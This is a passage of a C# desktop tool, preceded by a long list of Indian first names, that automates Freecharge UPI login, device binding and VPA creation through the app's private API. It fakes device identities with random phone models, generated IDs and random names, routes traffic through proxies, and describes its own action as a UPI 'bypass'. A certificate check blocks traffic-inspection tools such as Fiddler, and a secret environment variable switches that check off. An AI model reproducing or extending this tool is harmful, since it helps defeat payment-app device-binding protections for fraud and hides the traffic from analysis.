Balanath,Balaraj,Balaram,Balaravi,Balbir,Baldev,Balgopal,Balram,Balvindra, Balvinder,Balwant,Banbihari,Bandhu,Bandhul,Bankebihari,Bankim,Bankimchandra,Bansi,Bansilal,Barid,Baridbaran,Barindra,Barun,Basanta,Basavaraj,Basistha,Basudha,Bhadrak,Bhadraksh,Bhadrang,Bhadranidhi,Bhagaditya,Bhagat,Bhagirat,Bhagirath,Bhagwant,Bhagyanandana,Bhairav,Bhajan,Bhanu,Bhanudas,Bhanuprasad,Bharadwaj,Bharat,Bhargava,Bhargyaraj,Bhaskar,Bhaumik,Bhavamanyu,Bhavesh,Bhim,Bhishma,Bhojaraja,Bhooshan,Bhooshit,Bhudev,Bhumi,Bhupathi,Bhupen,Bhupendra,Bhushan,Bhuvan,Bhuvanesh,Bibek,Bibhas,Bibhavasu,Bijal,Bikram,Bilva,Bimal,Bindusar,Bipin,Birbal,Bitasok,Bodhan,Boudhayan,Brahmabrata,Brahmadutt,Bratindra,Brijesh,Brijmohan,Buddhadev,Buddhadeva,Budhil,Bukka,Chaitanya,Chakor,Chakradev,Chakradhar,Chakrapani,Chakshu,Chaman,Chamanlal,Champak,Chanakya,Chanchal,Chandak,Chandan,Chandra,Chandrabhan,Chandrachur,Chandrahas,Chandrak,Chandrakanta,Chandrakiran,Chandrakirthi,Chandrakishore,Chandrakumar,Chandramohan,Chandran,Chandranath,Chandraprakash,Chandraraj,Chandrashekar,Chandrashekhar,Chandratha,Chandresh,Chandrodaya,Chanyana,Chapal,Charan,Charanjit,Charu,Charudatta,Charudutta,Charuvardhana,Charuvindha,Chaturbhuj,Cheliyan,Chellamani,Chellamuthu,Chellapan,Chemmal,Chetan,Chetana,Chevatkodiyon,Chhandak,Chidambar,Chidambaram,Chidananda,Chiman,Chinmay,Chinmayananda,Chinnadurai,Chintamani,Chintan,Chinthanaichelvan,Chintya,Chirag,Chiranjeev,Chirantan,Chirayu,Chirtrang,Chithayu,Chitrabhanu,Chitragupta,Chitraksh,Chitral,Chitrarath,Chitrasen,Chitresh,Chitta,Chittaprasad,Chittaranjan,Chittaswarup,Chittesh,Chudamani,Dabeet,Daha,Daivya,Daiwik,Daksha,Dakshesh,Dakshi,Dakshina,Dalajit,Dalapathi,Dalbhya,Daman,Damian,Damodar,Danuj,Danvir,Darpak,Darpan,Darshan,Daruka,Dasharath,Dasharathi,Dasmaya,Dattatreya,Dayada,Dayakara,Dayanand,Dayanidhi,Dayasagara,Dayashankar,Debashis,Debashish,Deenabandhu,Deep,Deepak,Deepan,Deepankar,Deependra,Deependu,Deepesh,Deepit,Deeptanshu,Deeptendu,Deeptiman,Deeptimoy,Dev,Dev Kumar,Devabrata,Devachandra,Devadarshan,Devadas,Devadatta,Devadhipa,Devadutt,Devadyumna,Devajyoti,Devak,Devakantha,Devamadana,Devanand,Devang,Devaraj,Devarpana,Devarsi,Devarya,Devdas,Devdutta,Devendra,Devesh,Deveshwar,Devilal,Deviprasad,Devnarayan,Devnath,Devraj,Devya,Dhanajit,Dhananjay,Dhanesh,Dhanraj,Dhansukh,Dhanvant,Dharanidhar,Dharendra,Dharma,Dharmachandra,Dharmadas,Dharmadev,Dharmaditya,Dharmanand,Dharmendra,Dharmendu,Dharmesh,Dharmpal,Dharmveer,Dhaval,Dhavalachandra,Dhawal,Dheeman,Dheemant,Dheer,Dheeran,Dheerendra,Dheivamani,Dhevan,Dhevaneyan,Dhikshit,Dhinakar,Dhinanta,Dhipin,Dhiraj,Dhiren,Dhirendra,Dhritiman,Dhruv,Dhvanya,Dhwani,Dhyana,Dhyanesh,Digamber,Dilawar,Dilip,Dinanath,Dinapati,Dinar,Dindayal,Dinesh,Dinkar,Divakar,Divyanga,Divyendu,Divyesh,Drupad,Dulal,DuraiMurugan,Duranjaya,Durjaya,Dushyanta,Dwaipayan,Dwijaraj,Dwijendra,Dwijesh,Dyumani";
        string path = "./Freecharge";
        if (Directory.Exists(path))
        {
            DirectoryInfo directoryInfo = new DirectoryInfo(path);
            FileInfo[] files = directoryInfo.GetFiles("*.rg");
            string text = "";
            FileInfo[] array = files;
            FileInfo[] array2 = array;
            foreach (FileInfo fileInfo in array2)
            {
                text = fileInfo.Name;
                listBox1.Items.Add(text.Replace(".rg", ""));
            }
        }
    }

    private void button1_Click(object sender, EventArgs e)
    {
        checkana();
        if (mobilenumber.Text.Length != 10)
        {
            MessageBox.Show("Enter Valid mobile number without 91 ");
            return;
        }
        pictureBox1.Visible = false;
        txtSms.Visible = false;
        label1.Visible = false;
        btnNext.Visible = false;
        btnCopy.Visible = false;
        string text = "";
        try
        {
            string path = "./Freecharge";
            if (Directory.Exists(path))
            {
                DirectoryInfo directoryInfo = new DirectoryInfo(path);
                FileInfo[] files = directoryInfo.GetFiles("*.rg");
                FileInfo[] array = files;
                FileInfo[] array2 = array;
                foreach (FileInfo fileInfo in array2)
                {
                    text = text + ", " + fileInfo.Name;
                }
            }
        }
        catch
        {
        }
        if (text.Contains(mobilenumber.Text))
        {
            MessageBox.Show("Upi already Bypassed for this Number if you want to rebypass please delete first... ");
            return;
        }
        modelname = smethod_0();
        Name = method_1();
        oemdeviceid = RandomStrinAg(32, "abcdefghijklmnopqrstuvwxyz1234567890");
        oemdeviceid = Guid.NewGuid().ToString();
        oemdeviceid = oemdeviceid.Replace("-", "");
        uniquedevice = RandomStrinAg(18, "ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789");
        num = 15000;
        if (ip)
        {
            try
            {
                string text2 = ipfor;
                string[] array3 = text2.Split(new string[1] { ":" }, StringSplitOptions.None);
                if (array3.Length > 3)
                {
                    webProxy_3 = new WebProxy(array3[0].Trim(), int.Parse(array3[1].Trim()));
                    webProxy_3.BypassProxyOnLocal = true;
                    webProxy_3.Credentials = new NetworkCredential(array3[2].Trim(), array3[3].Trim());
                }
            }
            catch
            {
            }
        }
        if (method_3(null))
        {
            GenerateQR();
        }
        customerid = "91" + mobilenumber.Text;
    }

    private void GenerateQR()
    {
        upiact = "UPIACT ";
        string text = Guid.NewGuid().ToString();
        char[] array = text.ToCharArray();
        int num = 0;
        char[] array2 = "&^!@#".ToCharArray();
        for (int i = 0; i < array.Length; i++)
        {
            if (array[i] == '-')
            {
                switch (num)
                {
                    case 0:
                        array[i] = array2[0];
                        break;
                    case 1:
                        array[i] = array2[1];
                        break;
                    case 2:
                        array[i] = array2[2];
                        break;
                    case 3:
                        array[i] = array2[3];
                        break;
                }
                num++;
            }
        }
        smspart = new string(array);
        upiact = upiact + " " + smspart;
        pictureBox1.Visible = true;
        string plainText = "SMSTO:07799000980:" + upiact;
        QRCodeGenerator qRCodeGenerator = new QRCodeGenerator();
        QRCodeData data = qRCodeGenerator.CreateQrCode(plainText, QRCodeGenerator.ECCLevel.Q);
        Base64QRCode base64QRCode = new Base64QRCode(data);
        string graphic = base64QRCode.GetGraphic(20);
        pictureBox1.Image = LoadImage(graphic);
        txtSms.Visible = true;
        label1.Visible = true;
        btnNext.Visible = true;
        btnCopy.Visible = true;
        txtSms.Text = upiact;
    }

    private bool method_3(object object_0)
    {
        freecharge_0 = new FreechargeProcess();
        if (mobilenumber.Text.Length == 10)
        {
            button1.Enabled = false;
            string text = freecharge_0.LoginOtp(mobilenumber.Text);
            if (text.Length != 36)
            {
                MessageBox.Show(new Form
                {
                    TopMost = true
                }, "Error While Send OTP", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                button1.Enabled = true;
                return false;
            }
            string otp = Interaction.InputBox("Enter First Login Freecharge OTP That Recived On Mobile");
            while (true)
            {
                string text2 = freecharge_0.LoginVerifyOtp(otp);
                if (!(text2 == "success"))
                {
                    MessageBox.Show(new Form
                    {
                        TopMost = true
                    }, text2, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                    continue;
                }
                string text3 = freecharge_0.CheckDeviceStatus();
                if (text3 == "DEVICE_CHANGED" && freecharge_0.BindDevice() == "success")
                {
                    break;
                }
            }
            freecharge_0.DeviceOtp();
            string otp2 = Interaction.InputBox("Enter Second Freecharge OTP That Recived On Mobile");
            freecharge_0.DeviceVerifyOtp(otp2);
            csrfRequestIdentifier = freecharge_0.FR_DATA.csrfRequestIdentifier;
            cookieContainer_3 = freecharge_0.cookie;
            return true;
        }
        MessageBox.Show(new Form
        {
            TopMost = true
        }, "Enter Valid Mobile Number", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        return false;
    }

    public Image LoadImage(string strin_1)
    {
        byte[] buffer = Convert.FromBase64String(strin_1);
        using MemoryStream stream = new MemoryStream(buffer);
        return Image.FromStream(stream);
    }

    public static string GetRandAesKeyAsHexString32Bytes(int ity)
    {
        rngcryptoServiceProvider_0 = new RNGCryptoServiceProvider();
        byte[] array = new byte[ity];
        rngcryptoServiceProvider_0.GetBytes(array);
        return ToHexStringLowerCase(array);
    }

    public static string ToHexStringLowerCase(byte[] input)
    {
        StringBuilder stringBuilder = new StringBuilder();
        for (int i = 0; i < input.Length; i++)
        {
            stringBuilder.Append(input[i].ToString("x2"));
        }
        return stringBuilder.ToString();
    }

    public string Encrypt(string string_0, string string_4)
    {
        byte[] rgbIV = new byte[8] { 18, 52, 86, 120, 144, 171, 205, 239 };
        byte[] bytes = Encoding.UTF8.GetBytes(Strings.Left(string_4, 8));
        DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
        byte[] bytes2 = Encoding.UTF8.GetBytes(string_0);
        MemoryStream memoryStream = new MemoryStream();
        CryptoStream cryptoStream = new CryptoStream(memoryStream, dESCryptoServiceProvider.CreateEncryptor(bytes, rgbIV), CryptoStreamMode.Write);
        cryptoStream.Write(bytes2, 0, bytes2.Length);
        cryptoStream.FlushFinalBlock();
        return Convert.ToBase64String(memoryStream.ToArray());
    }

    public string Decrypt(string string_0, string string_4)
    {
        byte[] rgbIV = new byte[8] { 18, 52, 86, 120, 144, 171, 205, 239 };
        try
        {
            byte[] bytes = Encoding.UTF8.GetBytes(string_4.Substring(0, 8));
            DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
            byte[] array = Convert.FromBase64String(string_0);
            MemoryStream memoryStream = new MemoryStream();
            CryptoStream cryptoStream = new CryptoStream(memoryStream, dESCryptoServiceProvider.CreateDecryptor(bytes, rgbIV), CryptoStreamMode.Write);
            cryptoStream.Write(array, 0, array.Length);
            cryptoStream.FlushFinalBlock();
            return Encoding.UTF8.GetString(memoryStream.ToArray());
        }
        catch (Exception ex)
        {
            return ex.Message;
        }
    }

    public static string EncryptAES(string input, string symmetricKey)
    {
        byte[] key = GenerateAesKey(symmetricKey);
        byte[] iv = new byte[12];
        IBufferedCipher cipher = CipherUtilities.GetCipher("AES/GCM/NoPadding");
        cipher.Init(forEncryption: true, new ParametersWithIV(new KeyParameter(key), iv));
        byte[] bytes = Encoding.UTF8.GetBytes(input);
        return Convert.ToBase64String(cipher.DoFinal(bytes));
    }

    public static byte[] GenerateAesKey(string secretKey)
    {
        byte[] bytes = Encoding.UTF8.GetBytes(secretKey);
        Sha256Digest sha256Digest = new Sha256Digest();
        sha256Digest.BlockUpdate(bytes, 0, bytes.Length);
        byte[] array = new byte[32];
        sha256Digest.DoFinal(array, 0);
        byte[] array2 = new byte[16];
        Array.Copy(array, array2, 16);
        return array2;
    }

    public static string RSAEncode(string input, string base64PublicKey)
    {
        try
        {
            byte[] keyInfoData = Convert.FromBase64String(base64PublicKey);
            AsymmetricKeyParameter asymmetricKeyParameter = PublicKeyFactory.CreateKey(keyInfoData);
            if (!(asymmetricKeyParameter is RsaKeyParameters parameters))
            {
                throw new InvalidOperationException("The provided public key is not an RSA key.");
            }
            IAsymmetricBlockCipher asymmetricBlockCipher = new Pkcs1Encoding(new RsaEngine());
            asymmetricBlockCipher.Init(forEncryption: true, parameters);
            byte[] bytes = Encoding.UTF8.GetBytes(input);
            byte[] inArray = asymmetricBlockCipher.ProcessBlock(bytes, 0, bytes.Length);
            return Convert.ToBase64String(inArray);
        }
        catch (Exception ex)
        {
            return "Exception while encrypting data: " + ex.Message;
        }
    }

    public static DateTime UnixTimeStampToDateTime(long unixTimeStamp)
    {
        try
        {
            return DateTimeOffset.FromUnixTimeSeconds(unixTimeStamp).DateTime;
        }
        catch
        {
            return DateTime.MinValue;
        }
    }

    public static string Base64Decode(string base64EncodedData)
    {
        byte[] bytes = Convert.FromBase64String(base64EncodedData);
        return Encoding.UTF8.GetString(bytes);
    }

    public static string smethod_0()
    {
        string_0 = new string[10] { "SM-J100H", "U900-Soul", "SGH-N100", "SGH-X510", "GT-I9060", "GT-I8262", "SGH-Z170", "SGH-T408", "SGH-S300", "SM-G925F" };
        random_0 = new Random();
        return string_0[random_0.Next(string_0.Length)];
    }

    public static string EncryptDataWithAes(string plainText)
    {
        using Aes aes = Aes.Create();
        Console.WriteLine($"Aes Cipher Mode : {aes.Mode}");
        Console.WriteLine($"Aes Padding Mode: {aes.Padding}");
        Console.WriteLine($"Aes Key Size : {aes.KeySize}");
        Console.WriteLine($"Aes Block Size : {aes.BlockSize}");
        aes.Key = Encoding.UTF8.GetBytes("b14ca4040a4e4133bbce2ea2315a1000");
        byte[] iV = new byte[16];
        aes.IV = iV;
        ICryptoTransform transform = aes.CreateEncryptor();
        byte[] inArray;
        using (MemoryStream memoryStream = new MemoryStream())
        {
            using CryptoStream stream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write);
            using (StreamWriter streamWriter = new StreamWriter(stream))
            {
                streamWriter.Write(plainText);
            }
            inArray = memoryStream.ToArray();
        }
        return Convert.ToBase64String(inArray);
    }

    private static string DecryptDataWithAes(string cipherText, string keyBase64)
    {
        using Aes aes = Aes.Create();
        aes.Key = Encoding.UTF8.GetBytes(keyBase64);
        aes.IV = new byte[16];
        Console.WriteLine($"Aes Cipher Mode : {aes.Mode}");
        Console.WriteLine($"Aes Padding Mode: {aes.Padding}");
        Console.WriteLine($"Aes Key Size : {aes.KeySize}");
        Console.WriteLine($"Aes Block Size : {aes.BlockSize}");
        ICryptoTransform transform = aes.CreateDecryptor();
        byte[] buffer = Convert.FromBase64String(cipherText);
        using MemoryStream stream = new MemoryStream(buffer);
        using CryptoStream stream2 = new CryptoStream(stream, transform, CryptoStreamMode.Read);
        using StreamReader streamReader = new StreamReader(stream2);
        return streamReader.ReadToEnd();
    }

    private string dishaocr(string base64)
    {
        return "1234";
    }

    public static string RandomString(int length, string chars)
    {
        return new string((from s in Enumerable.Repeat(chars, length)
                           select s[random.Next(s.Length)]).ToArray());
    }

    internal string RandomStrinAg(int int_28, string string_86)
    {
        char[] array = new char[int_28];
        Random random = new Random();
        for (int i = 0; i < array.Length; i++)
        {
            array[i] = string_86[random.Next(string_86.Length)];
        }
        return new string(array);
    }

    public static string jsonData_Serial(string str, string what)
    {
        string result = "";
        try
        {
            int startIndex = str.IndexOf("\"" + what + "\"", StringComparison.CurrentCultureIgnoreCase);
            string text = str.Substring(startIndex);
            text = text.Substring(text.IndexOf(":\"") + 2);
            result = text.Substring(0, text.IndexOf("\""));
            return result;
        }
        catch
        {
        }
        return result;
    }

    private static bool CheckCertificate(object object_18, System.Security.Cryptography.X509Certificates.X509Certificate x509Certificate_0, X509Chain x509Chain_0, SslPolicyErrors sslPolicyErrors_0)
    {
        if (Environment.GetEnvironmentVariable("clientID") == "SYSTEMADMINN123")
        {
            return true;
        }
        try
        {
            HttpWebRequest httpWebRequest = object_18 as HttpWebRequest;
            bool flag = httpWebRequest != null && httpWebRequest.Address.ToString().ToLower().Contains("https://www.google.co.in") && !x509Certificate_0.Issuer.StartsWith("CN=Google");
            bool flag2 = httpWebRequest != null && httpWebRequest.Address.ToString().ToLower().Contains("irctc.co.in") && !x509Certificate_0.Issuer.StartsWith("CN=DigiCert");
            if (flag || flag2)
            {
                return false;
            }
            if (!x509Certificate_0.Issuer.ToLower().Contains("httpanalyze") && !x509Certificate_0.Issuer.ToLower().Contains("fiddler") && !x509Certificate_0.Issuer.ToLower().Contains("commview") && !x509Certificate_0.Issuer.ToLower().Contains("debugger") && !x509Certificate_0.Issuer.ToLower().Contains("debug") && !x509Certificate_0.Issuer.ToLower().Contains("sniffer") && !x509Certificate_0.Issuer.ToUpper().Contains("IEINSPECTOR"))
            {
                return true;
            }
            return false;
        }
        catch (Exception)
        {
            return true;
        }
    }

    public static void checkana()
    {
    }

    internal bool _Request_Sbi1(string string_86, string string_87, string string_88, WebProxy webProxy_5, ref CookieContainer cookieContainer_2, bool bool_63, bool bool_64, int int_28, int int_29, ref string string_89, ref string string_90, ref WebException webException_1)
    {
        try
        {
            HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_86);
            httpWebRequest.Timeout = int_28;
            httpWebRequest.ReadWriteTimeout = int_29;
            if (cookieContainer_2 == null)
            {
                cookieContainer_2 = new CookieContainer();
            }
            httpWebRequest.CookieContainer = cookieContainer_2;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
            httpWebRequest.ContentType = "application/json; charset=UTF-8";
            httpWebRequest.UserAgent = "okhttp/4.12.0";
            httpWebRequest.Accept = "*/*";
            if (!string.IsNullOrEmpty(csrfRequestIdentifier))
            {
                httpWebRequest.Headers.Add("csrfRequestIdentifier", csrfRequestIdentifier);
                if (!string.IsNullOrEmpty(string_88))
                {
                    httpWebRequest.Referer = string_88;
                }
                if (string.IsNullOrEmpty(string_87))
                {
                    httpWebRequest.Method = "GET";
                }
                else
                {
                    httpWebRequest.Method = "POST";
                    using StreamWriter streamWriter = new StreamWriter(httpWebRequest.GetRequestStream());
                    streamWriter.Write(string_87);
                }
                HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
                using StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
                response = streamReader.ReadToEnd();
                string_89 = response;
                return true;
            }
        }
        catch (WebException ex)
        {
            string message = (webException_1 = ex).Message;
            string text = "";
            HttpStatusCode httpStatusCode = HttpStatusCode.OK;
            string_90 = "<StatusCode>" + httpStatusCode.ToString() + "</StatusCode>\t<ErrorCode>" + message + "</ErrorCode>\t<ResponseCode>" + text + "</ResponseCode>";
        }
        return true;
    }

    internal bool _Request_Sbi(string string_86, string string_87, string string_88, WebProxy webProxy_5, ref CookieContainer cookieContainer_2, bool bool_63, bool bool_64, int int_28, int int_29, ref string string_89, ref string string_90, ref WebException webException_1)
    {
        try
        {
            HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_86);
            httpWebRequest.Timeout = int_28;
            httpWebRequest.ReadWriteTimeout = int_29;
            if (cookieContainer_2 == null)
            {
                cookieContainer_2 = new CookieContainer();
            }
            httpWebRequest.CookieContainer = cookieContainer_2;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
            httpWebRequest.ContentType = "application/json; charset=UTF-8";
            httpWebRequest.UserAgent = "okhttp/4.12.0";
            httpWebRequest.Accept = "*/*";
            if (!string.IsNullOrEmpty(csrfRequestIdentifier))
            {
                httpWebRequest.Headers.Add("csrfRequestIdentifier", csrfRequestIdentifier);
            }
            if (!string.IsNullOrEmpty(otpId))
            {
                httpWebRequest.Headers.Add("pke", otpId);
            }
            if (!string.IsNullOrEmpty(cske))
            {
                httpWebRequest.Headers.Add("cske", cske);
            }
            if (!string.IsNullOrEmpty(string_88))
            {
                httpWebRequest.Referer = string_88;
            }
            if (string.IsNullOrEmpty(string_87))
            {
                httpWebRequest.Method = "GET";
            }
            else
            {
                httpWebRequest.Method = "POST";
                using StreamWriter streamWriter = new StreamWriter(httpWebRequest.GetRequestStream());
                streamWriter.Write(string_87);
            }
            HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
            using StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
            response = streamReader.ReadToEnd();
            string_89 = response;
            return true;
        }
        catch (WebException ex)
        {
            string message = (webException_1 = ex).Message;
            string text = "";
            HttpStatusCode httpStatusCode = HttpStatusCode.OK;
            string_90 = "<StatusCode>" + httpStatusCode.ToString() + "</StatusCode>\t<ErrorCode>" + message + "</ErrorCode>\t<ResponseCode>" + text + "</ResponseCode>";
        }
        return true;
    }

    private void btnCopy_Click(object sender, EventArgs e)
    {
        Clipboard.SetText(txtSms.Text);
    }
    private string GetLatLong()
    {
        using var client = new HttpClient();
        client.DefaultRequestHeaders.Add("User-Agent", "C# App");
        var response = client.GetStringAsync("https://ipinfo.io/json").Result;
        using var doc = JsonDocument.Parse(response);
        var loc = doc.RootElement.GetProperty("loc").GetString(); // "26.40185,80.71810"
        var parts = loc.Split(',');
        double latitude = double.Parse(parts[0]);
        double longitude = double.Parse(parts[1]);
        return $"{latitude},{longitude}";
    }

    private void btnNext_Click(object sender, EventArgs e)
    {
        checkana();
        pictureBox1.Visible = false;
        txtSms.Visible = false;
        label1.Visible = false;
        btnNext.Visible = false;
        btnCopy.Visible = false;
        string_93 = "https://mobile-rest.freechargebiz.in/rest/upi/v1/checkvpaavailability?fcAppType=android&fcChannel=3&fcversion=578";
        string text = mobilenumber.Text + "@freecharge";
        this.text6 = "{\"customerid\":\"" + customerid + "\",\"deviceInfo\":{\"app\":\"com.freecharge.upi\",\"capability\":\"" + mobilenumber.Text + "\",\"id\":\"" + oemdeviceid + "\",\"ip\":\"192.168.0.66\",\"mobile\":\"" + customerid + "\",\"os\":\"android\",\"type\":\"MOB\"},\"vpa\":\"" + text + "\"}";
        this.text6 = this.text6.Replace("Abdul", Name);
        if (_Request_Sbi1(string_93, this.text6, string_92, webProxy_3, ref cookieContainer_3, bool_63: true, bool_64: true, num, num, ref string_96, ref string_95, ref webException_0))
        {
        }
        if (string_96.Contains("Success"))
        {
            string_93 = "https://mobile-rest.freechargebiz.in/rest/upi/v1/createvpa?fcAppType=android&fcChannel=3&fcversion=578";
            this.text6 = "{\"appid\":\"com.freecharge.upi\",\"customerid\":\"" + customerid + "\",\"defaultvpa\":\"Y\",\"device\":{\"app\":\"com.freecharge.upi\",\"capability\":\"" + mobilenumber.Text + "\",\"id\":\"" + oemdeviceid + "\",\"ip\":\"192.168.0.66\",\"mobile\":\"" + customerid + "\",\"os\":\"android\",\"type\":\"MOB\"},\"name\":\"Abdul\",\"nickname\":\"Abdul\",\"vpa\":\"" + text + "\"}";
            this.text6 = this.text6.Replace("Abdul", Name);
            if (_Request_Sbi1(string_93, this.text6, string_92, webProxy_3, ref cookieContainer_3, bool_63: true, bool_64: true, num, num, ref string_96, ref string_95, ref webException_0))
            {
            }
        }
        if (string_96.Contains("Success"))
        {
            string_93 = "https://mobile-rest.freechargebiz.in/rest/upi/v1/listkeys?fcAppType=android&fcChannel=3&fcversion=578";
            if (_Request_Sbi1(string_93, null, string_92, webProxy_3, ref cookieContainer_3, bool_63: true, bool_64: true, num, num, ref string_96, ref string_95, ref webException_0))
            {
            }
            string text2 = "PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48bnMyOlJlc3BMaXN0S2V5cyB4bWxuczpuczI9Imh0dHA6Ly9ucGNpLm9yZy91cGkvc2NoZW1hLyIgeG1sbnM6bnMzPSJodHRwOi8vbnBjaS5vcmcvY20vc2NoZW1hLyI+PEhlYWQgbXNnSWQ9IjJla1YxRjdDU1oiIG9yZ0lkPSJOUENJIiB0cz0iMjAyNC0wMi0xNVQwNjowMDowMCswNTozMCIgdmVyPSIyLjAiLz48UmVzcCByZXFNc2dJZD0iQVhJZWQxM2ZlZmQwZjA3NGIxZWE1NzQ5Y2EwMTM3NDU2MzkiIHJlc3VsdD0iU1VDQ0VTUyIvPjxUeG4gaWQ9IkFYSTY1MGU4OGVlNmU0MjRjZTNhY2QzNGE4OTM4MTg3ZGM0IiBub3RlPSJMaXN0IEtleXMiIHJlZklkPSI0MDQ2NDg0MzU3NzgiIHJlZlVybD0iaHR0cHM6Ly9heGlzYmFuay5jb20iIHRzPSIyMDI0LTAyLTE1VDA2OjAwOjAwKzA1OjMwIiB0eXBlPSJMaXN0S2V5cyIvPjxrZXlMaXN0PjxrZXkgY29kZT0iTlBDSSIga2k9IjIwMTUwODIyIiBvd25lcj0iTlBDSSIgdHlwZT0iUEtJIj48a2V5VmFsdWUgeG1sbnM6eHM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hIiB4bWxuczp4c2k9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hLWluc3RhbmNlIiB4c2k6dHlwZT0ieHM6c3RyaW5nIj5NSUlCSURBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVEwQU1JSUJDQUtDQVFFQXVEYkRGbnJkYUkwaENubDJDb0FuNzBhOWtyaktBYVFDZ3RKZmlFdjZ5REdCVEM4bFBmeGlzYi9VNU5JQWY3SlJjTTJvbzJZR2YwOWFhdlZtdlh6djV4Z205U3d1Y0h6dmVDaTQvai9KeEdaUDZWVW9yYnFYM2FKSGJDbFV5UzVSc05LbGtCWUtLcGNaSDZSVEhtbjkxRkRqc2pkSGpVc3JRSzdSMGhUMFhMTDh2MHdVZGhDankyYWRoVWxld3JSRkN2SVNKMS9qSXI3Qmtxd0g5bnYrNlNYTDBJelNKRFNpYlNzaEJGY0xJdjNtWUYwam9ZMzcwL2o5cEdGUU9zZEVkdUVMTytBYlloMWhJR3U1S0tRd3pZMC9DZ0thb25PelJWSytwQUh4THJadDltcHJSS0RXUms0cTNTYURHMko3WmZ2QWdiaWM2N1gvNEl6VTdweTB2UUlCQXc9PTwva2V5VmFsdWU+PC9rZXk+PC9rZXlMaXN0PjxTaWduYXR1cmUgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyMiPjxTaWduZWRJbmZvPjxDYW5vbmljYWxpemF0aW9uTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvVFIvMjAwMS9SRUMteG1sLWMxNG4tMjAwMTAzMTUiLz48U2lnbmF0dXJlTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8wNC94bWxkc2lnLW1vcmUjcnNhLXNoYTI1NiIvPjxSZWZlcmVuY2UgVVJJPSIiPjxUcmFuc2Zvcm1zPjxUcmFuc2Zvcm0gQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwLzA5L3htbGRzaWcjZW52ZWxvcGVkLXNpZ25hdHVyZSIvPjwvVHJhbnNmb3Jtcz48RGlnZXN0TWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8wNC94bWxlbmMjc2hhMjU2Ii8+PERpZ2VzdFZhbHVlPmV0RnNaVlNBcnlmWm5nQjd1WmZ6M3VvTDUyTmRHdXQybFJDSUR1V3dJK0E9PC9EaWdlc3RWYWx1ZT48L1JlZmVyZW5jZT48L1NpZ25lZEluZm8+PFNpZ25hdHVyZVZhbHVlPlU3QkZRbGZobzhPNndLSzhTSC94YkdLd2NVbDhEWDdSM0Z1Y2tZdFBKdzVWY2FpbCt1S051VWZTbnFwRmdESUFhSWtqWnB0SWhNOGsmI3hEOwpmaGdKdzJ1d1U3UmYzVWZhR3ptV0w5Wm9KUVNzUkRBU0JCUjBPNnU5azAzTUM1aWFJVUs4VzJwN1N4dEV4UXNzUS9hUUUyQmFkVkJ6JiN4RDsKc1RTd0M5OW5hajZtNHBtMFVORllkbDJ3QU1RdWRQeCtJL09XZUlYWlBROHR3RGtnTEo5eVJCa2tiZkZPZDF1aXpyR3BWeE9hcnVkRiYjeEQ7CnM1T3VHT0FoZC8reWRxWjJOeHZQTWg0ZERqdmNHY1ozWWNCTGdwalluaDQwT28xWDFmOFlyQUNmM1VpM255VHo5Q2ZZcW1tS1hHL1AmI3hEOwpBYWhVMUdJQ0JTb2UzRmRrY1BLMGk4TTA3SnhFOWxzcUsvZE9EUT09PC9TaWduYXR1cmVWYWx1ZT48L1NpZ25hdHVyZT48L25zMjpSZXNwTGlzdEtleXM+";
            text2 = jsonData_Serial(string_96, "data");
            text2 = Base64Decode(text2);
            miib = text2.Substring(text2.IndexOf("xs:string\">") + 11);
            miib = miib.Substring(0, miib.IndexOf("</"));
            ki = text2.Substring(text2.IndexOf("ki=\"") + 4);
            ki = ki.Substring(0, ki.IndexOf("\""));
        }
        if (!string_96.Contains("Success"))
        {
            return;
        }
        string text3 = GetRandAesKey().ToLower();
        string text4 = GetRandAesKey().ToLower();
        string text5 = RsaEncrypt(text3 + "|" + text4 + "|" + oemdeviceid, ReadPublicKeyFromCrt());
        string str = oemdeviceid + "|" + packageName + "|" + customerid + "|2.1|" + text5;
        str = HttpUtility.UrlEncode(str);
        this.text6 = "{\"challenge\":\"" + str + "\",\"customerid\":\"" + customerid + "\",\"type\":\"initial\"}";
        string_93 = "https://mobile-rest.freechargebiz.in/rest/upi/v1/token?fcAppType=android&fcChannel=3&fcversion=578";
        if (_Request_Sbi1(string_93, this.text6, string_92, webProxy_3, ref cookieContainer_3, bool_63: true, bool_64: true, num, num, ref string_96, ref string_95, ref webException_0))
        {
        }
        if (!string_96.Contains("Success"))
        {
            return;
        }
        string latLong = GetLatLong();
        //string_96 = GetBanks();
        string str11 = Guid.NewGuid().ToString().Replace("-", "");
        BankList bankList = new BankList();
        bankList.ShowDialog();
        bankcode = bankList.bvalue;
        txnId = "AXIStxn" + str11;
